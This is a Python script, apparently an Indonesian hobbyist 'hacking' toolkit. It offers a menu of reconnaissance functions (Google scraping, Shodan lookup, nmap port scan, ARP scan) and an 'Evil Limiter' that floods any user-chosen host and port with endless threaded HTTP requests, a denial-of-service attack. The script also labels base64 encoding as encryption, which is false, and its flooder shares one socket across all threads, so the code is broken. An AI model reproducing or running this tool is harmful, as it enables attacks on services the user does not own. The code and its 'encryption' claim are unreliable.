#Muhammad Arif Faisal
#Cyber cirebon timur
#Hacking

import os
import requests
from bs4 import BeautifulSoup
import nmap
from scapy.all import *
import socket
import threading
import hashlib
import base64
import paramiko
import time


MERAH = "\033[91m"
HIJAU = "\033[92m"
KUNING = "\033[93m"
BIRU = "\033[94m"
UNGU = "\033[95m"
CYAN = "\033[96m"


print( "\033[92m" """ 
             .__  _____                          
_____ _______|__|/ ____\                         
\__  \\_  __ \  \   __\                          
 / __ \|  | \/  ||  |                            
(____  /__|  |__||__|                            
     \/                                          
___________      .__               .__           
\_   _____/____  |__| ___________  |  |          
 |    __) \__  \ |  |/  ___/\__  \ |  |          
 |     \   / __ \|  |\___ \  / __ \|  |__        
 \___  /  (____  /__/____  >(____  /____/        
     \/        \/        \/      \/              

""")

def google_search(target):
    try:
        url = f"https://www.google.com/search?q={target}"
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, "html.parser")
        hasil = []
        for link in soup.find_all("a"):
            hasil.append(link.get("href"))
        return hasil
    except Exception as e:
        print(f"Error: {e}")

def shodan_search(target, api_key):
    try:
        url = f"https://api.shodan.io/shodan/host/{target}?key={api_key}"
        response = requests.get(url)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")

def port_scanning(target):
    try:
        nm = nmap.PortScanner()
        nm.scan(target, '1-1024')
        hasil = nm.all_hosts()
        return hasil
    except Exception as e:
        print(f"Error: {e}")

def arp_scanning(target):
    try:
        arp_request = ARP(pdst=target)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=0)[0]
        hasil = []
        for element in answered_list:
            hasil.append(element[1].psrc)
        return hasil
    except Exception as e:
        print(f"Error: {e}")

def enkripsi(text):
    hasil = base64.b64encode(text.encode())
    return hasil.decode()

def deskripsi(text):
    hasil = base64.b64decode(text.encode())
    return hasil.decode()

def evil_limiter(target, port, jumlah_thread):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for _ in range(jumlah_thread):
        threading.Thread(target=evil_limiter_thread, args=(target, port, sock)).start()

def evil_limiter_thread(target, port, sock):
    while True:
        try:
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            time.sleep(1)
        except:
            pass
        
          
def main():
    while True:
        print("\033[93m")
        print("Menu:")
        print("1. Pencarian Google")
        print("2. Pencarian Shodan")
        print("3. Scanning Port")
        print("4. Scanning ARP")
        print("5. Enkripsi")
        print("6. Deskripsi")
        print("7. Evil Limiter")
        print("8. Keluar")
        pilihan = input("Pilih menu: ")
        if pilihan == "1":
            target = input("Masukkan target: ")
            hasil = google_search(target)
            print(hasil)
        elif pilihan == "2":
            target = input("Masukkan target: ")
            api_key = input("Masukkan API key Shodan: ")
            hasil = shodan_search(target, api_key)
            print(hasil)
        elif pilihan == "3":
            target = input("Masukkan target: ")
            hasil = port_scanning(target)
            print(hasil)
        elif pilihan == "4":
            target = input("Masukkan target: ")
            hasil = arp_scanning(target)
            print(hasil)
        elif pilihan == "5":
            text = input("Masukkan teks untuk dienkripsi: ")
            hasil = enkripsi(text)
            print(hasil)
        elif pilihan == "6":
            text = input("Masukkan teks untuk dideskripsi: ")
            hasil = deskripsi(text)
            print(hasil)
        elif pilihan == "7":
            target = input("Masukkan target: ")
            port = int(input("Masukkan port: "))
            jumlah_thread = int(input("Masukkan jumlah thread: "))
            evil_limiter(target, port, jumlah_thread)
            
        elif pilihan == "8":
            break
        else:
            print("Pilihan tidak valid.")

if __name__ == "__main__":
    main()
